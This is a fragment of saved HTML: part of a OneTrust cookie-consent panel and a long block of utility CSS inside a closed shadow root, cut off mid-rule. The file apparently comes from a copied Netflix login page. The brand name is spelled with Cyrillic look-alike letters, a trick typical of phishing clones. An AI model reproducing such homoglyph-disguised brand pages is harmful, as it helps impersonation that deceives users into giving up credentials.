                    <br> Finally, Nеtflіх supports the self-regulatory Principles for Online Behavioral Advertising programs of the Digital Advertising Alliance (DAA), the Digital Advertising Alliance of Canada (DAAC), and the European Interactive Digital Advertising Alliance (EDAA).
                  </p>
                  <div class="ot-hlst-cntr">
                    <button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0004">Cookies Details‎</button>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- Vendors / Hosts -->
          <section id="ot-pc-lst" class="ot-hide ot-pc-scrollbar ot-enbl-chr">
            <div class="ot-lst-cntr ot-pc-scrollbar">
              <div id="ot-pc-hdr">
                <div id="ot-lst-title">
                  <button class="ot-link-btn back-btn-handler" aria-label="Back">
                    <svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531" xml:space="preserve">
                      <title>Back Button</title>
                      <g>
                        <path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                  l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                  c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                  s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                  L213.13,222.409z"></path>
                      </g>
                    </svg>
                  </button>
                  <h3>Cookie List</h3>
                </div>
                <div class="ot-lst-subhdr">
                  <div id="ot-search-cntr">
                    <p role="status" class="ot-scrn-rdr"></p>
                    <input id="vendor-search-handler" type="text" name="vendor-search-handler" placeholder="Search…" aria-label="Cookie list search">
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true">
                      <path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
              s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
              c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
              s-17-7.626-17-17S14.61,6,23.984,6z"></path>
                    </svg>
                  </div>
                  <div id="ot-fltr-cntr">
                    <button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true">
                      <svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577" xml:space="preserve">
                        <title>Filter Button</title>
                        <g>
                          <path fill="#2c3643" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
                            c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
                            c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
                            C402.765,25.895,404.093,19.231,400.858,11.427z"></path>
                        </g>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
              <section id="ot-lst-cnt" class="ot-pc-scrollbar">
                <div class="ot-sdk-row">
                  <div class="ot-sdk-column">
                    <div id="ot-sel-blk">
                      <div class="ot-sel-all">
                        <div class="ot-sel-all-hdr">
                          <span class="ot-consent-hdr">Consent</span>
                          <span class="ot-li-hdr">Leg.Interest</span>
                        </div>
                        <div class="ot-sel-all-chkbox">
                          <div class="ot-chkbox" id="ot-selall-hostcntr">
                            <input id="select-all-hosts-groups-handler" type="checkbox">
                            <label for="select-all-hosts-groups-handler">
                              <span class="ot-label-txt">checkbox label</span>
                            </label>
                            <span class="ot-label-status">label</span>
                          </div>
                          <div class="ot-chkbox" id="ot-selall-vencntr">
                            <input id="select-all-vendor-groups-handler" type="checkbox">
                            <label for="select-all-vendor-groups-handler">
                              <span class="ot-label-txt">checkbox label</span>
                            </label>
                            <span class="ot-label-status">label</span>
                          </div>
                          <div class="ot-chkbox" id="ot-selall-licntr">
                            <input id="select-all-vendor-leg-handler" type="checkbox">
                            <label for="select-all-vendor-leg-handler">
                              <span class="ot-label-txt">checkbox label</span>
                            </label>
                            <span class="ot-label-status">label</span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <ul id="ot-host-lst"></ul>
                  </div>
                </div>
              </section>
            </div>
            <div id="ot-anchor"></div>
            <section id="ot-fltr-modal">
              <div id="ot-fltr-cnt">
                <button id="clear-filters-handler">Clear</button>
                <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
                  <div class="ot-fltr-opts">
                    <div class="ot-fltr-opt">
                      <div class="ot-chkbox">
                        <input id="chkbox-id" type="checkbox" class="category-filter-handler">
                        <label for="chkbox-id">
                          <span class="ot-label-txt">checkbox label</span>
                        </label>
                        <span class="ot-label-status">label</span>
                      </div>
                    </div>
                  </div>
                  <div class="ot-fltr-btns">
                    <button id="filter-apply-handler">Apply</button>
                    <button id="filter-cancel-handler">Cancel</button>
                  </div>
                </div>
              </div>
            </section>
          </section>
          <!-- Footer buttons and logo -->
          <div class="ot-pc-footer ot-pc-scrollbar">
            <div class="ot-btn-container">
              <button class="save-preference-btn-handler onetrust-close-btn-handler">Save settings</button>
              <div class="ot-btn-subcntr"></div>
            </div>
            <div class="ot-pc-footer-logo">
              <a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" aria-label="Powered by OneTrust Opens in a new Tab">
                <img alt="Powered by Onetrust" src="./login_files/powered_by_logo.svg" title="Powered by OneTrust Opens in a new Tab">
              </a>
            </div>
          </div>
          <!-- Cookie subgroup container -->
          <!-- Vendor list link -->
          <!-- Cookie lost link -->
          <!-- Toggle HTML element -->
          <!-- Checkbox HTML -->
          <!-- Arrow SVG element -->
          <!-- Accordion basic element -->
          <span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite"></span>
          <!-- Vendor Service container and item template -->
        </div>
      </div>
    </div>
  </body>
  <s30fee83f-62dc-407c-b2bc-a11b8631cef3>
    <template shadowrootmode="closed">
      <div id="61c6a4e1-21f6-49ed-adbd-866c895114d5" style="position: fixed; top: 0px; left: 50%; transform: translateX(-50%); z-index: 2147483647;"></div>
      <style>
        *,
        :after,
        :before {
          border: 0 solid #1b1b1b33;
          box-sizing: border-box
        }

        :after,
        :before {
          --tw-content: ""
        }

        html {
          line-height: 1.5;
          -webkit-text-size-adjust: 100%;
          font-family: Lato, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
          font-feature-settings: normal;
          font-variation-settings: normal;
          tab-size: 4
        }

        body {
          line-height: inherit;
          margin: 0
        }

        hr {
          border-top-width: 1px;
          color: inherit;
          height: 0
        }

        abbr:where([title]) {
          text-decoration: underline dotted
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
          font-size: inherit;
          font-weight: inherit
        }

        a {
          color: inherit;
          text-decoration: inherit
        }

        b,
        strong {
          font-weight: bolder
        }

        code,
        kbd,
        pre,
        samp {
          font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace;
          font-size: 1em
        }

        small {
          font-size: 80%
        }

        sub,
        sup {
          font-size: 75%;
          line-height: 0;
          position: relative;
          vertical-align: initial
        }

        sub {
          bottom: -.25em
        }

        sup {
          top: -.5em
        }

        table {
          border-collapse: collapse;
          border-color: inherit;
          text-indent: 0
        }

        button,
        input,
        optgroup,
        select,
        textarea {
          color: inherit;
          font-family: inherit;
          font-size: 100%;
          font-weight: inherit;
          line-height: inherit;
          margin: 0;
          padding: 0
        }

        button,
        select {
          text-transform: none
        }

        [type=button],
        [type=reset],
        [type=submit],
        button {
          -webkit-appearance: button;
          background-color: initial;
          background-image: none
        }

        :-moz-focusring {
          outline: auto
        }

        :-moz-ui-invalid {
          box-shadow: none
        }

        progress {
          vertical-align: initial
        }

        ::-webkit-inner-spin-button,
        ::-webkit-outer-spin-button {
          height: auto
        }

        [type=search] {
          -webkit-appearance: textfield;
          outline-offset: -2px
        }

        ::-webkit-search-decoration {
          -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
          -webkit-appearance: button;
          font: inherit
        }

        summary {
          display: list-item
        }

        blockquote,
        dd,
        dl,
        figure,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        p,
        pre {
          margin: 0
        }

        fieldset {
          margin: 0
        }

        fieldset,
        legend {
          padding: 0
        }

        menu,
        ol,
        ul {
          list-style: none;
          margin: 0;
          padding: 0
        }

        textarea {
          resize: vertical
        }

        input::placeholder,
        textarea::placeholder {
          color: #5e5e5e;
          opacity: 1
        }

        [role=button],
        button {
          cursor: pointer
        }

        :disabled {
          cursor: default
        }

        audio,
        canvas,
        embed,
        iframe,
        img,
        object,
        svg,
        video {
          display: block;
          vertical-align: middle
        }

        img,
        video {
          height: auto;
          max-width: 100%
        }

        [hidden] {
          display: none
        }

        :host,
        :root {
          --white-fixed: 255 255 255;
          --black-fixed: 27 27 27;
          --background-low: 243 243 243;
          --background-high: 255 255 255;
          --background-overlay: #1b1b1bad;
          --background-success: 10 133 80;
          --background-caution: 222 39 23;
          --background-attention: 255 161 0;
          --text-primary: 27 27 27;
          --text-secondary: 94 94 94;
          --text-disabled: #1b1b1b5c;
          --text-accent-primary: 62 95 255;
          --text-accent-secondary: 59 84 199;
          --text-accent-disabled: #1b1b1b5c;
          --text-success: 6 121 72;
          --text-caution: 191 34 19;
          --text-attention: 217 108 0;
          --text-on-accent-primary: 255 255 255;
          --text-on-accent-secondary: #ffffffb3;
          --text-on-accent-disabled: #fff;
          --fill-accent-primary: 62 95 255;
          --fill-accent-secondary: 59 84 199;
          --fill-accent-tertiary: 43 67 178;
          --fill-accent-disabled: #1b1b1b33;
          --fill-grey-primary: 255 255 255;
          --fill-grey-secondary: 241 241 241;
          --fill-grey-tertiary: 250 250 250;
          --fill-grey-disabled: #1b1b1b33;
          --fill-grey-neutral: 136 136 136;
          --fill-grey-black: 27 27 27;
          --fill-success: 10 133 80;
          --fill-caution: 222 39 23;
          --fill-attention: 255 161 0;
          --stroke-divider: 224 224 224;
          --stroke-card-soft: 237 237 237;
          --stroke-card-medium: #1b1b1b4d;
          --stroke-disabled: #1b1b1b33;
          --system-info: 62 95 255;
          --system-success: 6 121 72;
          --system-caution: 255 126 35;
          --system-attention: 191 34 19;
          --system-critical: 191 34 19
        }

        .dark {
          --white-fixed: 255 255 255;
          --black-fixed: 27 27 27;
          --background-low: 63 63 63;
          --background-high: 27 27 27;
          --background-overlay: #1b1b1bad;
          --background-success: 24 134 87;
          --background-caution: 222 39 23;
          --background-attention: 255 161 0;
          --text-primary: 255 255 255;
          --text-secondary: 207 207 207;
          --text-disabled: #ffffff54;
          --text-accent-primary: 97 124 255;
          --text-accent-secondary: 59 84 199;
          --text-accent-disabled: #ffffff5c;
          --text-success: 51 204 112;
          --text-caution: 255 120 107;
          --text-attention: 250 146 0;
          --text-on-accent-primay: 255 255 255;
          --text-on-accent-secondary: #ffffffb3;
          --text-on-accent-disabled: #ffffff5c;
          --fill-accent-primary: 62 95 255;
          --fill-accent-secondary: 59 84 199;
          --fill-accent-tertiary: 43 67 178;
          --fill-grey-primary: 63 63 63;
          --fill-grey-secondary: 41 41 41;
          --fill-grey-tertiary: 32 32 32;
          --fill-grey-neutral: 162 162 162;
          --fill-accent-disabled: #ffffff26;
          --fill-grey-disabled: #ffffff26;
          --fill-grey-black: 255 255 255;
          --fill-success: 24 134 87;
          --fill-caution: 222 39 23;
          --fill-attention: 255 161 0;
          --stroke-divider: 46 46 46;
          --stroke-card-soft: 45 45 45;
          --stroke-card-medium: #75757575;
          --stroke-disabled: #ffffff26;
          --system-info: 62 95 255;
          --system-success: 51 204 112;
          --system-caution: 227 122 48;
          --system-attention: 255 120 107;
          --system-critical: 255 120 107
        }

        *,
        ::backdrop,
        :after,
        :before {
          --tw-border-spacing-x: 0;
          --tw-border-spacing-y: 0;
          --tw-translate-x: 0;
          --tw-translate-y: 0;
          --tw-rotate: 0;
          --tw-skew-x: 0;
          --tw-skew-y: 0;
          --tw-scale-x: 1;
          --tw-scale-y: 1;
          --tw-pan-x: ;
          --tw-pan-y: ;
          --tw-pinch-zoom: ;
          --tw-scroll-snap-strictness: proximity;
          --tw-gradient-from-position: ;
          --tw-gradient-via-position: ;
          --tw-gradient-to-position: ;
          --tw-ordinal: ;
          --tw-slashed-zero: ;
          --tw-numeric-figure: ;
          --tw-numeric-spacing: ;
          --tw-numeric-fraction: ;
          --tw-ring-inset: ;
          --tw-ring-offset-width: 0px;
          --tw-ring-offset-color: #fff;
          --tw-ring-color: #3b82f680;
          --tw-ring-offset-shadow: 0 0 #0000;
          --tw-ring-shadow: 0 0 #0000;
          --tw-shadow: 0 0 #0000;
          --tw-shadow-colored: 0 0 #0000;
          --tw-blur: ;
          --tw-brightness: ;
          --tw-contrast: ;
          --tw-grayscale: ;
          --tw-hue-rotate: ;
          --tw-invert: ;
          --tw-saturate: ;
          --tw-sepia: ;
          --tw-drop-shadow: ;
          --tw-backdrop-blur: ;
          --tw-backdrop-brightness: ;
          --tw-backdrop-contrast: ;
          --tw-backdrop-grayscale: ;
          --tw-backdrop-hue-rotate: ;
          --tw-backdrop-invert: ;
          --tw-backdrop-opacity: ;
          --tw-backdrop-saturate: ;
          --tw-backdrop-sepia:
        }

        .container {
          width: 100%
        }

        @media (min-width:640px) {
          .container {
            max-width: 640px
          }
        }

        @media (min-width:768px) {
          .container {
            max-width: 768px
          }
        }

        @media (min-width:1024px) {
          .container {
            max-width: 1024px
          }
        }

        @media (min-width:1280px) {
          .container {
            max-width: 1280px
          }
        }

        @media (min-width:1536px) {
          .container {
            max-width: 1536px
          }
        }

        .sr-only {
          height: 1px;
          margin: -1px;
          overflow: hidden;
          padding: 0;
          position: absolute;
          width: 1px;
          clip: rect(0, 0, 0, 0);
          border-width: 0;
          white-space: nowrap
        }

        .pointer-events-none {
          pointer-events: none
        }

        .\!visible {
          visibility: visible !important
        }

        .sticky {
          position: sticky
        }

        .inset-0 {
          inset: 0
        }

        .inset-y-0 {
          bottom: 0;
          top: 0
        }

        .bottom-0 {
          bottom: 0
        }

        .bottom-\[64px\] {
          bottom: 64px
        }

        .left-0 {
          left: 0
        }

        .left-1\/2,
        .left-2\/4 {
          left: 50%
        }

        .top-1\/2 {
          top: 50%
        }

        .top-2 {
          top: .5em
        }

        .top-2\/4 {
          top: 50%
        }

        .z-50 {
          z-index: 50
        }

        .z-\[1\] {
          z-index: 1
        }

        .m-0 {
          margin: 0
        }

        .\!mt-0 {
          margin-top: 0 !important
        }

        .\!mt-0\.5 {
          margin-top: .125em !important
        }

        .ml-1\.5 {
          margin-left: .375em
        }

        .ml-10 {
          margin-left: 2.5em
        }

        .ml-4 {
          margin-left: 1em
        }

        .mr-0 {
          margin-right: 0
        }

        .mr-10 {
          margin-right: 2.5em
        }

        .mr-4 {
          margin-right: 1em
        }

        .mt-0 {
          margin-top: 0
        }

        .mt-0\.5 {
          margin-top: .125em
        }

        .line-clamp-2 {
          -webkit-line-clamp: 2
        }

        .line-clamp-2,
        .line-clamp-3 {
          display: -webkit-box;
          overflow: hidden;
          -webkit-box-orient: vertical
        }

        .line-clamp-3 {
          -webkit-line-clamp: 3
        }

        .line-clamp-4 {
          -webkit-line-clamp: 4
        }

        .line-clamp-4,
        .line-clamp-5 {
          display: -webkit-box;
          overflow: hidden;
          -webkit-box-orient: vertical
        }

        .line-clamp-5 {
          -webkit-line-clamp: 5
        }

        .line-clamp-6 {
          display: -webkit-box;
          overflow: hidden;
          -webkit-box-orient: vertical;
          -webkit-line-clamp: 6
        }

        .table {
          display: table
        }

        .inline-table {
          display: inline-table
        }

        .table-caption {
          display: table-caption
        }

        .table-cell {
          display: table-cell
        }

        .table-column {
          display: table-column
        }

        .table-column-group {
          display: table-column-group
        }

        .table-footer-group {
          display: table-footer-group
        }

        .table-header-group {
          display: table-header-group
        }

        .table-row-group {
          display: table-row-group
        }

        .table-row {
          display: table-row
        }

        .flow-root {
          display: flow-root
        }

        .inline-grid {
          display: inline-grid
        }

        .contents {
          display: contents
        }

        .list-item {
          display: list-item
        }

        .h-11 {
          height: 2.75em
        }

        .h-12 {
          height: 3em
        }

        .h-2 {
          height: .5em
        }

        .h-3\.5 {
          height: .875em
        }

        .h-\[154px\] {
          height: 154px
        }

        .h-\[18px\] {
          height: 18px
        }

        .h-\[20px\] {
          height: 20px
        }

        .h-\[49px\] {
          height: 49px
        }

        .h-px {
          height: 1px
        }

        .max-h-\[165px\] {
          max-height: 165px
        }

        .max-h-\[205px\] {
          max-height: 205px
        }

        .min-h-15 {
          min-height: 3.75em
        }

        .min-h-\[154px\] {
          min-height: 154px
        }

        .w-12 {
          width: 3em
        }

        .w-2 {
          width: .5em
        }

        .w-3\.5 {
          width: .875em
        }

        .w-44 {
          width: 11em
        }

        .w-\[18px\] {
          width: 18px
        }

        .w-\[38px\] {
          width: 38px
        }

        .w-\[43\%\] {
          width: 43%
        }

        .w-\[49px\] {
          width: 49px
        }

        .w-\[57\%\] {
          width: 57%
        }

        .min-w-0 {
          min-width: 0
        }

        .min-w-19\.5 {
          min-width: 4.875em
        }

        .min-w-35\.5 {
          min-width: 8.875em
        }

        .min-w-42\.5 {
          min-width: 10.625em
        }

        .flex-1 {
          flex: 1 1 0%
        }

        .flex-shrink {
          flex-shrink: 1
        }

        .flex-grow-0 {
          flex-grow: 0
        }

        .-translate-x-1\/2,
        .-translate-x-2\/4 {
          --tw-translate-x: -50%
        }

        .-translate-x-1\/2,
        .-translate-x-2\/4,
        .-translate-y-1\/2 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-translate-y-1\/2 {
          --tw-translate-y: -50%
        }

        .-translate-y-1\/4 {
          --tw-translate-y: -25%
        }

        .-translate-y-1\/4,
        .-translate-y-2\/4 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-translate-y-2\/4 {
          --tw-translate-y: -50%
        }

        .translate-x-1 {
          --tw-translate-x: .25em
        }

        .translate-x-1,
        .translate-x-5 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .translate-x-5 {
          --tw-translate-x: 1.25em
        }

        .translate-y-0 {
          --tw-translate-y: 0px
        }

        .translate-y-0,
        .translate-y-1\/2 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .translate-y-1\/2 {
          --tw-translate-y: 50%
        }

        .-rotate-90 {
          --tw-rotate: -90deg
        }

        .-rotate-90,
        .rotate-180 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .rotate-180 {
          --tw-rotate: 180deg
        }

        .rotate-90 {
          --tw-rotate: 90deg
        }

        .rotate-90,
        .scale-100 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .scale-100 {
          --tw-scale-x: 1;
          --tw-scale-y: 1
        }

        .scale-95 {
          --tw-scale-x: .95;
          --tw-scale-y: .95
        }

        .-scale-x-100,
        .scale-95 {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-scale-x-100 {
          --tw-scale-x: -1
        }

        .transform {
          transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        @keyframes spin {
          to {
            transform: rotate(1turn)
          }
        }

        .animate-spin {
          animation: spin 1s linear infinite
        }

        .cursor-auto {
          cursor: auto
        }

        .select-none {
          user-select: none
        }

        .\!resize-none {
          resize: none !important
        }

        .appearance-none {
          appearance: none
        }

        .flex-wrap {
          flex-wrap: wrap
        }

        .flex-wrap-reverse {
          flex-wrap: wrap-reverse
        }

        .gap-4 {
          gap: 1em
        }

        .gap-x-3 {
          column-gap: .75em
        }

        .gap-x-3\.5 {
          column-gap: .875em
        }

        .gap-y-3 {
          row-gap: .75em
        }

        .overflow-auto {
          overflow: auto
        }

        .break-all {
          word-break: break-all
        }

        .rounded-full {
          border-radius: 9999px
        }

        .\!border-0 {
          border-width: 0 !important
        }

        .border-none {
          border-style: none
        }

        .border-disabled {
          border-color: var(--fill-accent-disabled)
        }

        .border-gray-700 {
          border-color: #1b1b1b4d
        }

        .border-transparent {
          border-color: #0000
        }

        .bg-black {
          background-color: rgb(var(--black-fixed))
        }

        .bg-black\/60 {
          background-color: rgb(var(--black-fixed)/.6)
        }

        .bg-disabled {
          background-color: var(--fill-accent-disabled)
        }

        .bg-gray-dark-400 {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        .bg-grey-disabled {
          background-color: var(--fill-grey-disabled)
        }

        .bg-primary {
          background-color: rgb(var(--fill-accent-primary))
        }

        .bg-transparent {
          background-color: initial
        }

        .fill-attention-foreground {
          fill: rgb(var(--text-attention))
        }

        .fill-black {
          fill: rgb(var(--black-fixed))
        }

        .fill-caution-foreground {
          fill: rgb(var(--text-caution))
        }

        .fill-disabled {
          fill: var(--fill-accent-disabled)
        }

        .fill-grey-neutral {
          fill: rgb(var(--fill-grey-neutral))
        }

        .fill-success-foreground {
          fill: rgb(var(--text-success))
        }

        .fill-system-attention {
          fill: rgb(var(--system-attention))
        }

        .fill-transparent {
          fill: #0000
        }

        .stroke-black {
          stroke: rgb(var(--black-fixed))
        }

        .stroke-disabled {
          stroke: var(--fill-accent-disabled)
        }

        .stroke-gray-300 {
          stroke: #1b1b1b5c
        }

        .stroke-gray-5 {
          stroke: #ffffff54
        }

        .stroke-grey-neutral {
          stroke: rgb(var(--fill-grey-neutral))
        }

        .stroke-white {
          stroke: rgb(var(--white-fixed))
        }

        .p-5 {
          padding: 1.25em
        }

        .px-3 {
          padding-left: .75em;
          padding-right: .75em
        }

        .py-1\.25 {
          padding-bottom: .3125em;
          padding-top: .3125em
        }

        .py-4 {
          padding-bottom: 1em;
          padding-top: 1em
        }

        .pb-0 {
          padding-bottom: 0
        }

        .pl-10 {
          padding-left: 2.5em
        }

        .pl-2 {
          padding-left: .5em
        }

        .pl-2\.5 {
          padding-left: .625em
        }

        .pr-2 {
          padding-right: .5em
        }

        .pr-2\.5 {
          padding-right: .625em
        }

        .pr-9 {
          padding-right: 2.25em
        }

        .pt-2\.5 {
          padding-top: .625em
        }

        .text-left {
          text-align: left
        }

        .text-right {
          text-align: right
        }

        .text-justify {
          text-align: justify
        }

        .text-end {
          text-align: end
        }

        .text-2xl {
          font-size: 1.5em;
          line-height: 1.17em
        }

        .text-sm {
          font-size: .875em;
          line-height: 1.43em
        }

        .text-xs {
          font-size: .75em;
          line-height: 1.34em
        }

        .font-medium {
          font-weight: 500
        }

        .font-normal {
          font-weight: 400
        }

        .font-semibold {
          font-weight: 600
        }

        .capitalize {
          text-transform: capitalize
        }

        .normal-case {
          text-transform: none
        }

        .leading-\[1\.67em\] {
          line-height: 1.67em
        }

        .text-black {
          color: rgb(var(--black-fixed))
        }

        .text-caution {
          color: rgb(var(--background-caution))
        }

        .text-caution-foreground {
          color: rgb(var(--text-caution))
        }

        .text-disabled-accent-foreground {
          color: var(--text-accent-disabled)
        }

        .text-disabled-foreground {
          color: var(--text-disabled)
        }

        .text-gray-200 {
          color: #1b1b1b33
        }

        .text-gray-500 {
          --tw-text-opacity: 1;
          color: rgb(237 237 237/var(--tw-text-opacity))
        }

        .text-grey-neutral {
          color: rgb(var(--fill-grey-neutral))
        }

        .text-primary {
          color: rgb(var(--fill-accent-primary))
        }

        .text-primary-accent-foreground {
          color: rgb(var(--text-accent-primary))
        }

        .text-primary-foreground {
          color: rgb(var(--text-primary))
        }

        .text-success {
          color: rgb(var(--background-success))
        }

        .text-success-foreground {
          color: rgb(var(--text-success))
        }

        .text-transparent {
          color: #0000
        }

        .text-white {
          color: rgb(var(--white-fixed))
        }

        .shadow {
          --tw-shadow: 0px 8px 8px #1b1b1b1f;
          --tw-shadow-colored: 0px 8px 8px var(--tw-shadow-color);
          box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .outline-none {
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .transition {
          transition-duration: .15s;
          transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
          transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-all {
          transition-duration: .15s;
          transition-property: all;
          transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .duration-100 {
          transition-duration: .1s
        }

        .duration-200 {
          transition-duration: .2s
        }

        .duration-300 {
          transition-duration: .3s
        }

        .ease-in {
          transition-timing-function: cubic-bezier(.4, 0, 1, 1)
        }

        .ease-out {
          transition-timing-function: cubic-bezier(0, 0, .2, 1)
        }

        .forced-color-adjust-none {
          forced-color-adjust: none
        }

        .visited\:text-secondary-accent-foreground:visited {
          color: rgb(var(--text-accent-secondary))
        }

        .checked\:border-\[9px\]:checked {
          border-width: 9px
        }

        .checked\:border-primary:checked {
          border-color: rgb(var(--fill-accent-primary))
        }

        .hover\:border-gray-700:hover {
          border-color: #1b1b1b4d
        }

        .hover\:bg-gray-200:hover {
          background-color: #1b1b1b33
        }

        .checked\:hover\:border-secondary:hover:checked {
          border-color: rgb(var(--fill-accent-secondary))
        }

        .focus\:outline-none:focus {
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .focus\:ring:focus {
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(3px + var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .focus\:ring-black:focus {
          --tw-ring-color: rgb(var(--black-fixed))
        }

        .focus-visible\:outline:focus-visible {
          outline-style: solid
        }

        .focus-visible\:outline-2:focus-visible {
          outline-width: 2px
        }

        .focus-visible\:outline-offset-2:focus-visible {
          outline-offset: 2px
        }

        .focus-visible\:outline-black:focus-visible {
          outline-color: rgb(var(--black-fixed))
        }

        .focus-visible\:ring:focus-visible {
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(3px + var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .focus-visible\:ring-gray-500:focus-visible {
          --tw-ring-opacity: 1;
          --tw-ring-color: rgb(237 237 237/var(--tw-ring-opacity))
        }

        .focus-visible\:ring-opacity-75:focus-visible {
          --tw-ring-opacity: .75
        }

        .active\:text-secondary-accent-foreground:active {
          color: rgb(var(--text-accent-secondary))
        }

        .checked\:disabled\:border-disabled:disabled:checked,
        .disabled\:border-disabled:disabled {
          border-color: var(--fill-accent-disabled)
        }

        .peer:checked~.peer-checked\:opacity-100 {
          opacity: 1
        }

        @media (forced-colors:active) {
          .forced-colors\:outline {
            outline-style: solid
          }

          .forced-colors\:outline-black {
            outline-color: rgb(var(--black-fixed))
          }
        }

        :is(.dark .dark\:border-gray-dark-600) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        :is(.dark .dark\:border-gray-dark-800) {
          --tw-border-opacity: 1;
          border-color: rgb(41 41 41/var(--tw-border-opacity))
        }

        :is(.dark .dark\:border-white) {
          border-color: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:bg-black) {
          background-color: rgb(var(--black-fixed))
        }

        :is(.dark .dark\:bg-black\/60) {
          background-color: rgb(var(--black-fixed)/.6)
        }

        :is(.dark .dark\:bg-gray-dark-400) {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        :is(.dark .dark\:bg-transparent) {
          background-color: initial
        }

        :is(.dark .dark\:bg-white) {
